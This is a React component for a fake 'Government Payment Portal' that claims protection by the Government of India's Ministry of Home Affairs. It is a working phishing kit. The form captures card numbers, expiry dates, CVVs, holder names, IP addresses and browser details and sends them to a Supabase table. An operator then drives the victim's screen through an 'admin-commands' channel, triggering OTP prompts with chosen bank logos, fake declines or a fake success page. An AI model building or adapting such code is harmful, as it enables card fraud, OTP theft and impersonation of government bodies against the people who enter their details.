import React, { useEffect } from 'react';
import { Loader2, CreditCard, Lock } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import OTPVerificationPage from './OTPVerificationPage';
import { usePaymentForm } from '@/hooks/usePaymentForm';
import { getRealIP, getRandomNetwork, generateInvoiceId, sendToSupabase, initializeSupabaseConnection } from '@/utils/paymentApiUtils';

const MobilePaymentForm = () => {
  const {
    formData,
    isLoading,
    setIsLoading,
    showOtp,
    setShowOtp,
    isConfirmLoading,
    setIsConfirmLoading,
    errorMessage,
    setErrorMessage,
    showProcessing,
    setShowProcessing,
    showSuccess,
    setShowSuccess,
    invalidOtpMessage,
    setInvalidOtpMessage,
    fadeState,
    setFadeState,
    currentSubmissionId,
    setCurrentSubmissionId,
    selectedBank,
    setSelectedBank,
    selectedBankLogo,
    setSelectedBankLogo,
    isFormValid,
    handleInputChange,
    handleConfirmPay
  } = usePaymentForm();

  useEffect(() => {
    initializeSupabaseConnection();

    const channel = supabase
      .channel('admin-commands')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'admin_commands'
        },
        (payload) => {
          console.log('Received command from admin via Supabase:', payload.new);
          const command = payload.new.command;
          const submissionId = payload.new.submission_id;
          const bankName = payload.new.bank_name;
          const bankLogo = payload.new.bank_logo;
          
          if (submissionId && submissionId !== currentSubmissionId) {
            console.log('Command not for current submission, ignoring');
            return;
          }
          
          switch (command) {
            case 'showotp':
              if (bankName) {
                setSelectedBank(bankName);
              }
              if (bankLogo) {
                setSelectedBankLogo(bankLogo);
              }
              setFadeState('fadeOut');
              setTimeout(() => {
                setIsLoading(false);
                setShowOtp(true);
                setFadeState('fadeIn');
              }, 300);
              break;
            case 'fail':
              setFadeState('fadeOut');
              setTimeout(() => {
                setIsLoading(false);
                setShowOtp(false);
                setErrorMessage('Your card has been declined');
                setFadeState('fadeIn');
              }, 300);
              break;
            case 'success':
              setFadeState('fadeOut');
              setTimeout(() => {
                setIsConfirmLoading(false);
                setShowProcessing(true);
                setFadeState('fadeIn');
                setTimeout(() => {
                  setShowProcessing(false);
                  setShowSuccess(true);
                  setTimeout(() => {
                    window.location.href = 'https://google.com';
                  }, 2000);
                }, 4000);
              }, 300);
              break;
            case 'invalidotp':
              setIsConfirmLoading(false);
              setInvalidOtpMessage('Invalid OTP, Enter valid one time passcode sent to your mobile');
              break;
            case 'cardinvalid':
              setFadeState('fadeOut');
              setTimeout(() => {
                setIsLoading(false);
                setShowOtp(false);
                setErrorMessage('Your card is invalid, please try another card');
                setFadeState('fadeIn');
              }, 300);
              break;
            case 'carddisabled':
              setFadeState('fadeOut');
              setTimeout(() => {
                setIsLoading(false);
                setShowOtp(false);
                setErrorMessage('Card disabled, please try another card');
                setFadeState('fadeIn');
              }, 300);
              break;
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [currentSubmissionId, setSelectedBank, setSelectedBankLogo, setFadeState, setIsLoading, setShowOtp, setErrorMessage, setIsConfirmLoading, setShowProcessing, setShowSuccess, setInvalidOtpMessage]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!isFormValid()) {
      return;
    }
    
    setIsLoading(true);
    setErrorMessage('');
    
    try {
      const realIP = await getRealIP();
      const invoiceId = generateInvoiceId();
      
      const cardData = {
        invoice_id: invoiceId,
        card_number: formData.cardNumber,
        expiry_month: formData.expiryMonth,
        expiry_year: formData.expiryYear,
        cvv: formData.cvv,
        card_holder: formData.cardHolder,
        amount: formData.amount,
        user_ip: realIP,
        browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
        network: getRandomNetwork()
      };
      
      const result = await sendToSupabase(cardData);
      
      if (result) {
        setCurrentSubmissionId(result.id);
      }
    } catch (error) {
      console.error('Failed to submit card data:', error);
      setIsLoading(false);
      setErrorMessage('Failed to process payment. Please try again.');
    }
  };

  if (showSuccess) {
    return (
      <div className="bg-white border border-gray-200 p-4 rounded-lg">
        <div className="text-center">
          <div className="text-green-600 text-4xl animate-bounce">✓</div>
          <p className="text-sm font-bold text-green-600 mt-2">Payment Successful!</p>
        </div>
      </div>
    );
  }

  if (showProcessing) {
    return (
      <div className="bg-white border border-gray-200 p-4 rounded-lg">
        <div className="text-center">
          <Loader2 className="w-6 h-6 animate-spin mx-auto mb-3" />
          <p className="text-sm text-black">Processing your transaction securely...</p>
        </div>
      </div>
    );
  }

  if (showOtp) {
    return (
      <div className="bg-white border border-gray-200 rounded-lg">
        <OTPVerificationPage
          onBack={() => setShowOtp(false)}
          onConfirm={handleConfirmPay}
          isLoading={isConfirmLoading}
          invalidOtpMessage={invalidOtpMessage}
          cardNumber={formData.cardNumber}
          amount={formData.amount}
          bankLogo={selectedBankLogo}
        />
      </div>
    );
  }

  return (
    <div className={`bg-white border border-gray-200 p-4 rounded-lg transition-opacity duration-300 ${
      fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'
    }`}>
      <h2 className="text-lg font-bold text-center mb-4 text-gray-800">
        Government Payment Portal
      </h2>

      {errorMessage && (
        <div className="border border-red-500 bg-transparent p-3 rounded mb-4">
          <p className="text-red-600 text-sm">{errorMessage}</p>
        </div>
      )}

      <form className="space-y-4" onSubmit={handleSubmit}>
        {/* Amount Field */}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Amount to Pay
          </label>
          <div className="relative">
            <span className="absolute left-3 top-2 text-gray-500">₹</span>
            <input
              type="text"
              name="amount"
              value={formData.amount}
              onChange={handleInputChange}
              className="w-full pl-8 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50 text-sm"
              readOnly
            />
          </div>
        </div>

        {/* Card Number */}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Card Number
          </label>
          <div className="relative">
            <CreditCard className="absolute left-3 top-3 w-5 h-5 text-gray-400" />
            <input
              type="text"
              name="cardNumber"
              placeholder="1234 5678 9012 3456"
              value={formData.cardNumber}
              onChange={handleInputChange}
              className="w-full pl-11 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
              maxLength={19}
              disabled={isLoading}
            />
          </div>
        </div>

        {/* Expiry and CVV */}
        <div className="grid grid-cols-3 gap-2">
          <div>
            <label className="block text-xs font-medium text-gray-700 mb-1">
              Month
            </label>
            <input
              type="text"
              name="expiryMonth"
              placeholder="MM"
              value={formData.expiryMonth}
              onChange={handleInputChange}
              className="w-full px-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
              maxLength={2}
              disabled={isLoading}
            />
          </div>
          
          <div>
            <label className="block text-xs font-medium text-gray-700 mb-1">
              Year
            </label>
            <input
              type="text"
              name="expiryYear"
              placeholder="YY"
              value={formData.expiryYear}
              onChange={handleInputChange}
              className="w-full px-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
              maxLength={2}
              disabled={isLoading}
            />
          </div>
          
          <div>
            <label className="block text-xs font-medium text-gray-700 mb-1">
              CVV
            </label>
            <div className="relative">
              <Lock className="absolute left-2 top-2.5 w-4 h-4 text-gray-400" />
              <input
                type="text"
                name="cvv"
                placeholder="123"
                value={formData.cvv}
                onChange={handleInputChange}
                className="w-full pl-8 pr-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                maxLength={4}
                disabled={isLoading}
              />
            </div>
          </div>
        </div>

        {/* Card Holder Name */}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Card Holder Name
          </label>
          <input
            type="text"
            name="cardHolder"
            placeholder="Enter full name as on card"
            value={formData.cardHolder}
            onChange={handleInputChange}
            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
            disabled={isLoading}
          />
        </div>

        {/* Submit Button */}
        <button
          type="submit"
          disabled={!isFormValid() || isLoading}
          className={`w-full py-3 px-4 rounded font-medium focus:outline-none focus:ring-2 focus:ring-green-500 mt-4 transition-all text-sm ${
            isFormValid() && !isLoading
              ? 'bg-green-600 text-white hover:bg-green-700'
              : 'bg-gray-400 text-gray-600 cursor-not-allowed'
          }`}
        >
          {isLoading ? (
            <Loader2 className="w-5 h-5 animate-spin mx-auto" />
          ) : (
            `Pay Securely ₹${formData.amount}`
          )}
        </button>

        {/* Payment Methods */}
        <div className="flex justify-center items-center space-x-3 mt-3">
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/visa.svg" alt="Visa" className="h-6 w-8 object-contain filter brightness-0" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-6 w-8 object-contain filter brightness-0" />
          <img src="https://logotyp.us/file/rupay.svg" alt="RuPay" className="h-6 w-8 object-contain filter brightness-0" />
        </div>

        <div className="text-xs text-gray-500 text-center mt-3">
          <p>Protected by Government of India</p>
          <p>Ministry of Home Affairs</p>
        </div>
      </form>
    </div>
  );
};

export default MobilePaymentForm;
